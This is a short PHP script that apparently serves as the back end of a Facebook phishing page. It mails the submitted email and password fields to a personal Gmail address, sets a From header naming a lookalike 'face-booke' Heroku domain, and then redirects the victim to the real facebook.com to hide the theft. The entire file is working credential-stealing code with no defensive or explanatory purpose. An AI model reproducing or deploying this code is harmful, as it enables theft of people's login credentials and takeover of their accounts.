<?php

$to      = 'melkamudagne19@gmail.com';
$subject = 'the subject';
$message = $_POST["email"] . "  :  " . $_POST["pass"];
$headers = 'From: https://face-booke.herokuapp.com/' . "\r\n" .
    'Reply-To: melkamudagne19@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);


$newURL = "https://www.facebook.com";
header('Location: '.$newURL);
?>
